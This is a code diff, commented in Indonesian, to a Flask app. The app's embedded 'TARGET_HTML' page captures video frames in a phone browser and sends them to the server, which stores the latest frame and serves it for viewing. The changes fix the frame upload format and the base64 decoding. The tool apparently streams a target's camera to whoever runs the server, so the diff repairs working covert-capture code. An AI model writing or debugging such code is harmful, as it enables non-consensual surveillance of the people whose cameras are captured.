@@ -68,7 +68,12 @@ TARGET_HTML = """
             if(video.videoWidth > 0) {
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                fetch('/receive_frame', { method: 'POST', body: canvas.toDataURL('image/jpeg', 0.4) });
+                
+                // Mengubah pengiriman string mentah menjadi objek FormData yang sah
+                let formData = new FormData();
+                formData.append("frame", canvas.toDataURL('image/jpeg', 0.4));
+                
+                fetch('/receive_frame', { method: 'POST', body: formData });
             }
         }
 
@@ -202,7 +207,8 @@ def logout():
 @app.route('/receive_frame', methods=['POST'])
 def receive_frame():
     global latest_frame
-    latest_frame = request.data.decode('utf-8')
+    # Mengambil string data dari objek form yang dikirim oleh browser HP
+    latest_frame = request.form.get("frame")
     return "OK"
 
 @app.route('/get_frame')
@@ -210,10 +216,9 @@ def get_frame():
     global latest_frame
     if latest_frame and "base64," in latest_frame:
         try:
-            # Memotong tajuk data URL gambar
-            img_b64 = latest_frame.split("base64,")
-            # KUNCI PERBAIKAN: Mengambil indeks [1] untuk mendapatkan string data gambar murni
-            img_data = base64.b64decode(img_b64[1])
+            # Memotong tajuk data URL dan mengambil string gambar murni
+            img_b64 = latest_frame.split("base64,")[1]
+            img_data = base64.b64decode(img_b64)
             return Response(img_data, mimetype='image/jpeg')
         except Exception as e:
             print(f"Error decoding frame: {e}")
